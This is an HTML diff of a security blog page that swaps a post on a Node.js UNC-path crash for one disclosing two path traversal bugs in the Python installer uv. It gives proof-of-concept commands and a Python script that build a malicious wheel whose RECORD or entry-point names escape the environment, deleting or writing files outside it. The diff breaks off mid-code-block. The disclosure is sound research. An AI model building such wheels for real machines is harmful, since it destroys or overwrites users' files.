@@ -30,26 +30,26 @@
 
   <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.4.1" />
-<meta property="og:title" content="A Weird UNC Path That can Crash Node.js" />
+<meta property="og:title" content="uv Path Traversal Findings: Arbitrary Delete and Write" />
 <meta name="author" content="snoopysecurity" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="Recently while fuzzing Node.js modules I found an issue which causes the process to abort when malformed Windows UNC style paths are passed into pathToFileURL(). This was initially something I looked at as a potential security issue due to the crash behavior, but after discussion with the Node.js security / WG team it was considered a bug and tracked publicly. I ended up opening a github issue here: https://github.com/nodejs/node/issues/62546" />
-<meta property="og:description" content="Recently while fuzzing Node.js modules I found an issue which causes the process to abort when malformed Windows UNC style paths are passed into pathToFileURL(). This was initially something I looked at as a potential security issue due to the crash behavior, but after discussion with the Node.js security / WG team it was considered a bug and tracked publicly. I ended up opening a github issue here: https://github.com/nodejs/node/issues/62546" />
-<link rel="canonical" href="http://localhost:4000/posts/nodejs-denial-of-service/" />
-<meta property="og:url" content="http://localhost:4000/posts/nodejs-denial-of-service/" />
+<meta name="description" content="Learning security while segfaulting through life" />
+<meta property="og:description" content="Learning security while segfaulting through life" />
+<link rel="canonical" href="http://localhost:4000/2026-05-17-uv-path-traversal-findings.html" />
+<meta property="og:url" content="http://localhost:4000/2026-05-17-uv-path-traversal-findings.html" />
 <meta property="og:site_name" content="💻 Blog" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2026-04-13T10:25:52+01:00" />
+<meta property="article:published_time" content="2026-05-17T12:05:52+01:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="A Weird UNC Path That can Crash Node.js" />
+<meta property="twitter:title" content="uv Path Traversal Findings: Arbitrary Delete and Write" />
 <meta name="twitter:site" content="@snoopysecurity" />
 <meta name="twitter:creator" content="@snoopysecurity" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"snoopysecurity"},"dateModified":"2026-04-13T10:25:52+01:00","datePublished":"2026-04-13T10:25:52+01:00","description":"Recently while fuzzing Node.js modules I found an issue which causes the process to abort when malformed Windows UNC style paths are passed into pathToFileURL(). This was initially something I looked at as a potential security issue due to the crash behavior, but after discussion with the Node.js security / WG team it was considered a bug and tracked publicly. I ended up opening a github issue here: https://github.com/nodejs/node/issues/62546","headline":"A Weird UNC Path That can Crash Node.js","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/nodejs-denial-of-service/"},"url":"http://localhost:4000/posts/nodejs-denial-of-service/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"snoopysecurity"},"dateModified":"2026-05-17T12:05:52+01:00","datePublished":"2026-05-17T12:05:52+01:00","description":"Learning security while segfaulting through life","headline":"uv Path Traversal Findings: Arbitrary Delete and Write","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2026-05-17-uv-path-traversal-findings.html"},"url":"http://localhost:4000/2026-05-17-uv-path-traversal-findings.html"}</script>
 <!-- End Jekyll SEO tag -->
 
 
-  <title>A Weird UNC Path That can Crash Node.js | 💻 | Blog</title>
+  <title>uv Path Traversal Findings: Arbitrary Delete and Write | 💻 | Blog</title>
 
   <!--
   The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
@@ -109,8 +109,6 @@
 
   <!-- 3rd-party Dependencies -->
 
-  
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css">
   
 
   
@@ -219,16 +217,9 @@
 
   
 
-  
-    
-
-    
-
-  
 
 
-
-  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.20/dayjs.min.js,npm/dayjs@1.11.20/locale/en.js,npm/dayjs@1.11.20/plugin/relativeTime.js,npm/dayjs@1.11.20/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js,npm/mermaid@11.13.0/dist/mermaid.min.js"></script>
+  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.20/dayjs.min.js,npm/dayjs@1.11.20/locale/en.js,npm/dayjs@1.11.20/plugin/relativeTime.js,npm/dayjs@1.11.20/plugin/localizedFormat.js,npm/mermaid@11.13.0/dist/mermaid.min.js"></script>
 
 
 
@@ -436,10 +427,8 @@
           
         
           
-        
-          
             
-              <span>A Weird UNC Path That can Crash Node.js</span>
+              <span>uv Path Traversal Findings: Arbitrary Delete and Write</span>
             
 
           
@@ -507,146 +496,6 @@
 
 
 
-  
-  
-
-  
-    
-      
-      
-    
-
-    
-    
-
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-      
-
-      
-    
-
-    <!-- take out classes -->
-    
-
-    
-
-    
-    
-
-    
-
-    
-      
-    
-
-    <!-- lazy-load images -->
-    
-
-    
-      <!-- make sure the `<img>` is wrapped by `<a>` -->
-      
-
-      
-        <!-- create the image wrapper -->
-        
-
-        
-        
-      
-    
-
-    <!-- combine -->
-    
-  
-    
-
-    
-    
-
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-      
-
-      
-    
-
-    <!-- take out classes -->
-    
-
-    
-
-    
-    
-
-    
-
-    
-      
-    
-
-    <!-- lazy-load images -->
-    
-
-    
-      <!-- make sure the `<img>` is wrapped by `<a>` -->
-      
-
-      
-        <!-- create the image wrapper -->
-        
-
-        
-        
-      
-    
-
-    <!-- combine -->
-    
-  
-
-  
-
 
 <!-- Add header for code snippets -->
 
@@ -662,6 +511,60 @@
   
 
   
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
 
   
   
@@ -674,6 +577,39 @@
       
         
         
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
       
 
       
@@ -735,9 +671,9 @@
 
 
 
-<article class="px-1" data-toc="true">
+<article class="px-1" data-toc="false">
   <header>
-    <h1 data-toc-skip>A Weird UNC Path That can Crash Node.js</h1>
+    <h1 data-toc-skip>uv Path Traversal Findings: Arbitrary Delete and Write</h1>
     
 
     <div class="post-meta text-muted">
@@ -754,13 +690,13 @@
 
 <time
   
-  data-ts="1776072352"
+  data-ts="1779015952"
   data-df="ll"
   
     data-bs-toggle="tooltip" data-bs-placement="bottom"
   
 >
-  Apr 13, 2026
+  May 17, 2026
 </time>
 
       </span>
@@ -812,9 +748,9 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="637 words"
+  title="814 words"
 >
-  <em>3 min</em> read</span>
+  <em>4 min</em> read</span>
 
         </div>
       </div>
@@ -822,59 +758,343 @@
   </header>
 
   
-    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
-      <span class="label text-truncate">A Weird UNC Path That can Crash Node.js</span>
-      <button type="button" class="toc-trigger btn me-1">
-        <i class="fa-solid fa-list-ul fa-fw"></i>
-      </button>
-    </div>
-
-    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
-      <span class="label ps-2 pe-1">Contents</span>
-      <i class="fa-solid fa-angle-right fa-fw"></i>
-    </button>
-
-    <dialog id="toc-popup" class="p-0">
-      <div class="header d-flex flex-row align-items-center justify-content-between">
-        <div class="label text-truncate py-2 ms-4">A Weird UNC Path That can Crash Node.js</div>
-        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
-          <i class="fas fa-close"></i>
-        </button>
-      </div>
-      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
-    </dialog>
-  
 
   <div class="content">
-    <p>Recently while fuzzing Node.js modules I found an issue which causes the process to abort when malformed Windows UNC style paths are passed into pathToFileURL(). This was initially something I looked at as a potential security issue due to the crash behavior, but after discussion with the Node.js security / WG team it was considered a bug and tracked publicly. I ended up opening a github issue here: <a href="https://github.com/nodejs/node/issues/62546">https://github.com/nodejs/node/issues/62546</a></p>
+    <p>I found these issues with the help of AI while reviewing <code class="language-plaintext highlighter-rouge">uv</code> wheel install/uninstall flows.</p>
 
-<p>I was fuzzing path / URL related functionality inside Node.js. The input which triggered the issue was:</p>
+<p>I contacted the maintainers about these findings two months ago (March 2026).</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+<p>This post covers two related path traversal issues:</p>
+
+<ol>
+  <li>Arbitrary file deletion via <code class="language-plaintext highlighter-rouge">RECORD</code> traversal during uninstall</li>
+  <li>Entrypoint script path traversal via malicious <code class="language-plaintext highlighter-rouge">entry_points.txt</code></li>
+</ol>
+
+<h2 id="finding-1-arbitrary-file-deletion-via-record-path-traversal"><span class="me-2">Finding 1: Arbitrary File Deletion via <code class="language-plaintext highlighter-rouge">RECORD</code> Path Traversal</span><a href="#finding-1-arbitrary-file-deletion-via-record-path-traversal" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p><code class="language-plaintext highlighter-rouge">uv</code> trusts file paths listed in <code class="language-plaintext highlighter-rouge">.dist-info/RECORD</code> during uninstall and deletes them without validating they stay within the expected environment root (such as <code class="language-plaintext highlighter-rouge">site-packages</code>).</p>
+
+<p>A malicious wheel can include traversal entries (for example <code class="language-plaintext highlighter-rouge">../../...</code>) in <code class="language-plaintext highlighter-rouge">RECORD</code>. During <code class="language-plaintext highlighter-rouge">uv pip uninstall</code>, this can delete files outside the virtual environment.</p>
+
+<h3 id="impact"><span class="me-2">Impact</span><a href="#impact" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<ul>
+  <li>Arbitrary file deletion with the permissions of the user running <code class="language-plaintext highlighter-rouge">uv</code></li>
+  <li>Deletion of files outside the virtual environment</li>
+  <li>Reachable through normal workflow:
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">uv pip install</code></li>
+      <li><code class="language-plaintext highlighter-rouge">uv pip uninstall</code></li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="root-cause"><span class="me-2">Root Cause</span><a href="#root-cause" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Uninstall flow:</p>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">uv</code> reads paths from <code class="language-plaintext highlighter-rouge">.dist-info/RECORD</code></li>
+  <li>Paths are joined with <code class="language-plaintext highlighter-rouge">site-packages</code></li>
+  <li>Resulting paths are deleted</li>
+</ol>
+
+<p>Missing guards:</p>
+
+<ul>
+  <li>No rejection of <code class="language-plaintext highlighter-rouge">..</code> traversal components in <code class="language-plaintext highlighter-rouge">RECORD</code> entries</li>
+  <li>No robust containment check after path resolution</li>
+  <li>Untrusted path input is used directly in file operations</li>
+</ul>
+
+<h3 id="code-references"><span class="me-2">Code References</span><a href="#code-references" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p><code class="language-plaintext highlighter-rouge">RECORD</code> parsing strips leading <code class="language-plaintext highlighter-rouge">/</code> but does not enforce containment:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">uv/crates/uv-install-wheel/src/wheel.rs:796</code></li>
+  <li><code class="language-plaintext highlighter-rouge">uv/crates/uv-install-wheel/src/wheel.rs:806</code></li>
+</ul>
+
+<div class="language-rust highlighter-rouge"><div class="code-header">
+        <span data-label-text="Rust"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>\\exa mple\share\file.txt
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td><td class="rouge-code"><pre><span class="cd">/// Reads the record file</span>
+<span class="cd">/// &lt;https://www.python.org/dev/peps/pep-0376/#record&gt;</span>
+<span class="k">pub</span> <span class="k">fn</span> <span class="nf">read_record_file</span><span class="p">(</span><span class="n">record</span><span class="p">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="k">impl</span> <span class="n">Read</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="nb">Result</span><span class="o">&lt;</span><span class="nb">Vec</span><span class="o">&lt;</span><span class="n">RecordEntry</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">Error</span><span class="o">&gt;</span> <span class="p">{</span>
+    <span class="nn">csv</span><span class="p">::</span><span class="nn">ReaderBuilder</span><span class="p">::</span><span class="nf">new</span><span class="p">()</span>
+        <span class="nf">.has_headers</span><span class="p">(</span><span class="k">false</span><span class="p">)</span>
+        <span class="nf">.escape</span><span class="p">(</span><span class="nf">Some</span><span class="p">(</span><span class="sc">b'"'</span><span class="p">))</span>
+        <span class="nf">.from_reader</span><span class="p">(</span><span class="n">record</span><span class="p">)</span>
+        <span class="nf">.deserialize</span><span class="p">()</span>
+        <span class="nf">.map</span><span class="p">(|</span><span class="n">entry</span><span class="p">|</span> <span class="p">{</span>
+            <span class="k">let</span> <span class="n">entry</span><span class="p">:</span> <span class="n">RecordEntry</span> <span class="o">=</span> <span class="n">entry</span><span class="o">?</span><span class="p">;</span>
+            <span class="nf">Ok</span><span class="p">(</span><span class="n">RecordEntry</span> <span class="p">{</span>
+                <span class="c1">// selenium uses absolute paths for some reason</span>
+                <span class="n">path</span><span class="p">:</span> <span class="n">entry</span><span class="py">.path</span><span class="nf">.trim_start_matches</span><span class="p">(</span><span class="sc">'/'</span><span class="p">)</span><span class="nf">.to_string</span><span class="p">(),</span>
+                <span class="o">..</span><span class="n">entry</span>
+            <span class="p">})</span>
+        <span class="p">})</span>
+        <span class="nf">.collect</span><span class="p">()</span>
+<span class="p">}</span>
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>Passing this into:</p>
+<p>Uninstall joins untrusted path and attempts deletion:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">uv/crates/uv-install-wheel/src/uninstall.rs:41</code></li>
+  <li><code class="language-plaintext highlighter-rouge">uv/crates/uv-install-wheel/src/uninstall.rs:68</code></li>
+  <li><code class="language-plaintext highlighter-rouge">uv/crates/uv-install-wheel/src/uninstall.rs:77</code></li>
+</ul>
+
+<div class="language-rust highlighter-rouge"><div class="code-header">
+        <span data-label-text="Rust"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>require('node:url').pathToFileURL(...)
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="k">let</span> <span class="n">path</span> <span class="o">=</span> <span class="n">site_packages</span><span class="nf">.join</span><span class="p">(</span><span class="o">&amp;</span><span class="n">entry</span><span class="py">.path</span><span class="p">);</span>
+
+<span class="k">match</span> <span class="nn">fs_err</span><span class="p">::</span><span class="nf">remove_file</span><span class="p">(</span><span class="o">&amp;</span><span class="n">path</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nf">Ok</span><span class="p">(())</span> <span class="k">=&gt;</span> <span class="p">{</span> <span class="cm">/* ... */</span> <span class="p">}</span>
+    <span class="nf">Err</span><span class="p">(</span><span class="n">err</span><span class="p">)</span> <span class="k">if</span> <span class="n">err</span><span class="nf">.kind</span><span class="p">()</span> <span class="o">==</span> <span class="nn">std</span><span class="p">::</span><span class="nn">io</span><span class="p">::</span><span class="nn">ErrorKind</span><span class="p">::</span><span class="n">NotFound</span> <span class="k">=&gt;</span> <span class="p">{}</span>
+    <span class="nf">Err</span><span class="p">(</span><span class="n">err</span><span class="p">)</span> <span class="k">=&gt;</span> <span class="k">match</span> <span class="nn">fs_err</span><span class="p">::</span><span class="nf">remove_dir_all</span><span class="p">(</span><span class="o">&amp;</span><span class="n">path</span><span class="p">)</span> <span class="p">{</span>
 </pre></td></tr></tbody></table></code></div></div>
+
+<p>Reachable from normal uninstall path:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">uv/crates/uv/src/commands/pip/operations.rs:802</code></li>
+  <li><code class="language-plaintext highlighter-rouge">uv/crates/uv-installer/src/uninstall.rs:10</code></li>
+</ul>
 
 <h3 id="proof-of-concept"><span class="me-2">Proof of Concept</span><a href="#proof-of-concept" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
 
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>node -e "require('node:url').pathToFileURL('\\\\\\\\exa mple\\\\share\\\\file.txt',{windows:true})"
-</pre></td></tr></tbody></table></code></div></div>
-<p>Result</p>
+<p>Create test workspace and venv:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="nb">mkdir</span> /tmp/uv-poc
+<span class="nb">cd</span> /tmp/uv-poc
+uv venv venv
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Create victim file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"do not delete"</span> <span class="o">&gt;</span> /tmp/uv-poc/victim.txt
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Get <code class="language-plaintext highlighter-rouge">site-packages</code> path:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>venv/bin/python <span class="nt">-c</span> <span class="s2">"import sysconfig; print(sysconfig.get_paths()['purelib'])"</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Calculate traversal path from <code class="language-plaintext highlighter-rouge">site-packages</code> to victim:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>python3 <span class="nt">-c</span> <span class="s2">"import os; print(os.path.relpath('/tmp/uv-poc/victim.txt', '&lt;SITE_PACKAGES_PATH&gt;'))"</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Build malicious wheel and replace <code class="language-plaintext highlighter-rouge">&lt;REL_PATH&gt;</code> with output above:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td><td class="rouge-code"><pre>python3 - <span class="o">&lt;&lt;</span><span class="sh">'</span><span class="no">PY</span><span class="sh">'
+import zipfile
+
+rel = "&lt;REL_PATH&gt;"
+wheel = "evil-0.1.0-py3-none-any.whl"
+dist = "evil-0.1.0.dist-info"
+
+with zipfile.ZipFile(wheel, "w") as z:
+    z.writestr("evil.py", "")
+    z.writestr(f"{dist}/METADATA", "Metadata-Version: 2.1</span><span class="se">\n</span><span class="sh">Name: evil</span><span class="se">\n</span><span class="sh">Version: 0.1.0</span><span class="se">\n</span><span class="sh">")
+    z.writestr(f"{dist}/WHEEL", "Wheel-Version: 1.0</span><span class="se">\n</span><span class="sh">Tag: py3-none-any</span><span class="se">\n</span><span class="sh">")
+    z.writestr(f"{dist}/RECORD",
+        "evil.py,,</span><span class="se">\n</span><span class="sh">"
+        f"{dist}/METADATA,,</span><span class="se">\n</span><span class="sh">"
+        f"{dist}/WHEEL,,</span><span class="se">\n</span><span class="sh">"
+        f"{dist}/RECORD,,</span><span class="se">\n</span><span class="sh">"
+        f"{rel},,</span><span class="se">\n</span><span class="sh">"
+    )
+</span><span class="no">PY
+</span></pre></td></tr></tbody></table></code></div></div>
+
+<p>Install then uninstall:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>uv pip <span class="nb">install</span> <span class="nt">--python</span> /tmp/uv-poc/venv/bin/python evil-0.1.0-py3-none-any.whl
+uv pip uninstall <span class="nt">--python</span> /tmp/uv-poc/venv/bin/python evil
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Check victim file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">ls</span> /tmp/uv-poc/victim.txt
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Vulnerable result:</p>
+
+<div class="language-text highlighter-rouge"><div class="code-header">
+        <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>No such file or directory
+</pre></td></tr></tbody></table></code></div></div>
+
+<h2 id="finding-2-entrypoint-script-path-traversal"><span class="me-2">Finding 2: Entrypoint Script Path Traversal</span><a href="#finding-2-entrypoint-script-path-traversal" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>A malicious wheel can include traversal sequences in <code class="language-plaintext highlighter-rouge">entry_points.txt</code> script names. If used directly when constructing script output paths, this can write files outside the intended scripts directory during installation.</p>
+
+<p>Normal entry point:</p>
+
+<div class="language-ini highlighter-rouge"><div class="code-header">
+        <span data-label-text="Ini"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nn">[console_scripts]</span><span class="w">
+</span><span class="py">ruff</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">ruff:main</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Expected output:</p>
+
+<div class="language-text highlighter-rouge"><div class="code-header">
+        <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>&lt;venv&gt;/bin/ruff
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Malicious entry point:</p>
+
+<div class="language-ini highlighter-rouge"><div class="code-header">
+        <span data-label-text="Ini"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nn">[console_scripts]</span><span class="w">
+</span><span class="na">../../</span><span class="py">outside</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">pkg:main</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>If script names are joined as raw filesystem components, traversal escapes <code class="language-plaintext highlighter-rouge">scripts</code> directory.</p>
+
+<h3 id="code-references-1"><span class="me-2">Code References</span><a href="#code-references-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<ul>
+  <li>Script names accepted from <code class="language-plaintext highlighter-rouge">entry_points.txt</code> without separator/traversal guard:
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">uv/crates/uv-install-wheel/src/script.rs:53</code></li>
+    </ul>
+  </li>
+  <li>Script path built by joining script name into scripts directory:
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">uv/crates/uv-install-wheel/src/wheel.rs:175</code></li>
+    </ul>
+  </li>
+  <li>Path later converted and written via joins without explicit destination containment check at these points:
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">uv/crates/uv-install-wheel/src/wheel.rs:210</code></li>
+      <li><code class="language-plaintext highlighter-rouge">uv/crates/uv-install-wheel/src/wheel.rs:710</code></li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="proof-of-concept-1"><span class="me-2">Proof of Concept</span><a href="#proof-of-concept-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<ol>
+  <li>Create virtual environment:</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="nb">mkdir</span> <span class="nt">-p</span> /tmp/uv-poc
+<span class="nb">cd</span> /tmp/uv-poc
+uv venv venv
+</pre></td></tr></tbody></table></code></div></div>
+
+<ol>
+  <li>Determine scripts directory:</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>venv/bin/python <span class="nt">-c</span> <span class="s2">"import sysconfig; print(sysconfig.get_paths()['scripts'])"</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<ol>
+  <li>Ensure target file does not exist:</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nb">rm</span> <span class="nt">-f</span> /tmp/uv-poc/entrypoint_victim.sh
+<span class="nb">ls</span> /tmp/uv-poc/entrypoint_victim.sh
+</pre></td></tr></tbody></table></code></div></div>
+
+<ol>
+  <li>Build malicious wheel:</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -902,257 +1122,72 @@
 25
 26
 27
-</pre></td><td class="rouge-code"><pre>snoopy@snoopy-MacBookPro11-4:~/$ node -e "require('node:url').pathToFileURL('\\\\\\\\exa mple\\\\share\\\\file.txt',{windows:true})"; echo $?
+28
